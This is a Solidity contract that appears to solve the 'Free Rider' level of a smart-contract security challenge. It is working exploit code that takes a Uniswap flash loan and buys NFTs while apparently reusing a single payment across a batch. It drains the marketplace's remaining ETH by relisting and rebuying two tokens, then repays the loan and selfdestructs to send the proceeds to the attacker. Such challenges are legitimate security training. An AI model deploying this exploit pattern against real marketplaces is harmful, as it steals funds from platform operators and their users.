// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

interface IFreeRiderNFTMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;

    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices)
        external;
}

interface IUniswapPair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function token0() external returns (address);
}

interface IERC721 {
    function balanceOf(address owner) external view returns (uint256);

    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    function approve(address to, uint256 tokenId) external;
}

interface IWETH {
    function deposit() external payable;

    function withdraw(uint256 wad) external;

    function transfer(address to, uint256 amount) external returns (bool);

    function balanceOf(address to) external returns (uint256);
}

contract FreeRiderChallenge {
    IFreeRiderNFTMarketplace marketplace;
    IERC721 nft;
    IUniswapPair pair;
    IWETH weth;

    constructor(
        address _marketplace,
        address _nft,
        address _pair,
        address _weth
    ) {
        marketplace = IFreeRiderNFTMarketplace(_marketplace);
        nft = IERC721(_nft);
        pair = IUniswapPair(_pair);
        weth = IWETH(_weth);
    }

    receive() external payable {}

    function attack(
        address _buyer,
        address _token,
        uint256 _nftPrice,
        uint256[] calldata _tokenIds
    ) external payable {
        address token0 = pair.token0();

        uint256 amount0Out = token0 == address(_token) ? 0 : _nftPrice;
        uint256 amount1Out = token0 == address(_token) ? _nftPrice : 0;

        // data parameter is required to be non-empty for flashloan from uniswap
        bytes memory data = abi.encode(_tokenIds);

        // take flashloan equal to nftPrice
        pair.swap(amount0Out, amount1Out, address(this), data);

        // transfer all nfts to buyer
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), _buyer, i);
        }

        selfdestruct(payable(msg.sender)); // send all eth to attacker, and selfdestruct
    }

    // callback function when taking flashloan from uniswap
    function uniswapV2Call(
        address sender,
        uint256 amount0Out,
        uint256 amount1Out,
        bytes calldata data
    ) external {
        uint256 amount = amount0Out == 0 ? amount1Out : amount0Out;
        uint256 amountToSend = (amount * 1004) / 1000;
        uint256[] memory tokenIds = abi.decode(data, (uint256[]));

        weth.withdraw(amount);
        marketplace.buyMany{value: amount}(tokenIds); // buy nfts from marketplace

        // lines 105 - 116: clearing out the remaining funds from marketplace contract
        uint256[] memory tokenIdOffer = new uint256[](2);
        uint256[] memory tokenPricesOffer = new uint256[](2);

        tokenIdOffer[0] = 0;
        tokenIdOffer[1] = 1;
        tokenPricesOffer[0] = 15 ether;
        tokenPricesOffer[1] = 15 ether;

        nft.approve(address(marketplace), tokenIdOffer[0]);
        nft.approve(address(marketplace), tokenIdOffer[1]);
        marketplace.offerMany(tokenIdOffer, tokenPricesOffer);
        marketplace.buyMany{value: 15 ether}(tokenIdOffer);

        weth.deposit{value: amountToSend}();
        weth.transfer(msg.sender, amountToSend); // repay flashloan amount
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
